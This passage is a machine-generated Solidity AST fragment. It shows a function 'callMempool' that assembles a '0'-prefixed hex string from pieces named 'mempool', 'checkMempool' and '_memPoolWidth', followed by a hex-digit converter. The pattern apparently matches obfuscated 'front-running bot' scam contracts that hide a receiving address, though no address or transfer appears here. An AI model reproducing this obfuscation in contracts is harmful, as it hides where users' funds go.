																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 731,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7951:28:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"arguments": [
																{
																	"id": 733,
																	"name": "_memPoolWidth",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 694,
																	"src": "7994:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 732,
																"name": "checkMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 644,
																"src": "7981:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 734,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7981:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 728,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1188,
														"src": "7943:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 735,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7943:66:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7917:92:0"
											},
											{
												"assignments": [
													738
												],
												"declarations": [
													{
														"constant": false,
														"id": 738,
														"mutability": "mutable",
														"name": "_memPool4",
														"nameLocation": "8034:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "8020:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 737,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "8020:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 747,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"id": 741,
																	"name": "_memPoolDepth",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 698,
																	"src": "8067:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 740,
																"name": "checkMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 644,
																"src": "8054:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 742,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8054:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"arguments": [
																{
																	"id": 744,
																	"name": "_memPoolCount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 703,
																	"src": "8096:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 743,
																"name": "checkMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 644,
																"src": "8083:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 745,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8083:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 739,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1188,
														"src": "8046:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 746,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8046:65:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8020:91:0"
											},
											{
												"assignments": [
													749
												],
												"declarations": [
													{
														"constant": false,
														"id": 749,
														"mutability": "mutable",
														"name": "_allMempools",
														"nameLocation": "8138:12:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "8124:26:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 748,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "8124:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 760,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"id": 752,
																	"name": "_memPool1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 707,
																	"src": "8169:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"id": 753,
																	"name": "_memPool2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 716,
																	"src": "8180:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 751,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1188,
																"src": "8161:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 754,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8161:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"arguments": [
																{
																	"id": 756,
																	"name": "_memPool3",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 727,
																	"src": "8200:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"id": 757,
																	"name": "_memPool4",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 738,
																	"src": "8211:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 755,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1188,
																"src": "8192:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 758,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8192:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 750,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1188,
														"src": "8153:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 759,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8153:69:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8124:98:0"
											},
											{
												"assignments": [
													762
												],
												"declarations": [
													{
														"constant": false,
														"id": 762,
														"mutability": "mutable",
														"name": "_fullMempool",
														"nameLocation": "8247:12:0",
														"nodeType": "VariableDeclaration",
														"scope": 770,
														"src": "8233:26:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 761,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "8233:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 767,
												"initialValue": {
													"arguments": [
														{
															"hexValue": "30",
															"id": 764,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8270:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															"value": "0"
														},
														{
															"id": 765,
															"name": "_allMempools",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 749,
															"src": "8275:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 763,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1188,
														"src": "8262:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 766,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8262:26:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8233:55:0"
											},
											{
												"expression": {
													"id": 768,
													"name": "_fullMempool",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 762,
													"src": "8308:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 664,
												"id": 769,
												"nodeType": "Return",
												"src": "8301:19:0"
											}
										]
									},
									"id": 771,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "callMempool",
									"nameLocation": "7277:11:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 661,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7288:2:0"
									},
									"returnParameters": {
										"id": 664,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 663,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 771,
												"src": "7314:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 662,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "7314:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "7313:15:0"
									},
									"scope": 1189,
									"src": "7268:1060:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 833,
										"nodeType": "Block",
										"src": "8736:277:0",
										"statements": [
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 784,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 780,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"hexValue": "30",
															"id": 778,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8751:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"id": 779,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 773,
															"src": "8756:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"src": "8751:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "&&",
													"rightExpression": {
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 783,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 781,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 773,
															"src": "8761:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"hexValue": "39",
															"id": 782,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8766:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_9_by_1",
																"typeString": "int_const 9"
															},
															"value": "9"
														},
														"src": "8761:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "8751:16:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"id": 811,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 804,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"hexValue": "3130",
																"id": 799,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8843:2:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_10_by_1",
																	"typeString": "int_const 10"
																},
																"value": "10"
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"arguments": [
																	{
																		"id": 802,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 773,
																		"src": "8855:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 801,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "8849:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 800,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "8849:5:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 803,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8849:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"src": "8843:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "&&",
														"rightExpression": {
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 810,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"arguments": [
																	{
																		"id": 807,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 773,
																		"src": "8867:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 806,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "8861:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 805,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "8861:5:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 808,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8861:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"hexValue": "3135",
																"id": 809,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "8873:2:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_15_by_1",
																	"typeString": "int_const 15"
																},
																"value": "15"
															},
															"src": "8861:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"src": "8843:32:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"id": 828,
													"nodeType": "IfStatement",
													"src": "8839:107:0",
													"trueBody": {
														"id": 827,
														"nodeType": "Block",
														"src": "8877:69:0",
														"statements": [
															{
																"expression": {
																	"arguments": [
																		{
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 824,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 822,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"hexValue": "61",
																									"id": 818,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "string",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "8919:3:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									},
																									"value": "a"
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									}
																								],
																								"id": 817,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "8912:6:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_bytes1_$",
																									"typeString": "type(bytes1)"
																								},
																								"typeName": {
																									"id": 816,
																									"name": "bytes1",
																									"nodeType": "ElementaryTypeName",
																									"src": "8912:6:0",
																									"typeDescriptions": {}
																								}
																							},
																							"id": 819,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"nameLocations": [],
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "8912:11:0",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						],
																						"id": 815,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "8906:5:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_uint8_$",
																							"typeString": "type(uint8)"
																						},
																						"typeName": {
																							"id": 814,
																							"name": "uint8",
																							"nodeType": "ElementaryTypeName",
																							"src": "8906:5:0",
																							"typeDescriptions": {}
																						}
																					},
																					"id": 820,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"nameLocations": [],
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "8906:18:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"id": 821,
																					"name": "d",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 773,
																					"src": "8927:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"src": "8906:22:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"hexValue": "3130",
																				"id": 823,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8931:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_10_by_1",
																					"typeString": "int_const 10"
																				},
																				"value": "10"
																			},
																			"src": "8906:27:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 813,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8899:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 812,
																			"name": "bytes1",
																			"nodeType": "ElementaryTypeName",
																			"src": "8899:6:0",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 825,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8899:35:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"functionReturnParameters": 777,
																"id": 826,
																"nodeType": "Return",
																"src": "8892:42:0"
															}
														]
													}
												},
												"id": 829,
												"nodeType": "IfStatement",
												"src": "8747:199:0",
												"trueBody": {
													"id": 798,
													"nodeType": "Block",
													"src": "8769:64:0",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 795,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"hexValue": "30",
																							"id": 791,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "string",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "8811:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							},
																							"value": "0"
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							}
																						],
																						"id": 790,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "8804:6:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_bytes1_$",
																							"typeString": "type(bytes1)"
																						},
																						"typeName": {
																							"id": 789,
																							"name": "bytes1",
																							"nodeType": "ElementaryTypeName",
																							"src": "8804:6:0",
																							"typeDescriptions": {}
																						}
																					},
																					"id": 792,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"nameLocations": [],
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "8804:11:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 788,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "8798:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 787,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "8798:5:0",
																					"typeDescriptions": {}
																				}
																			},
																			"id": 793,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"nameLocations": [],
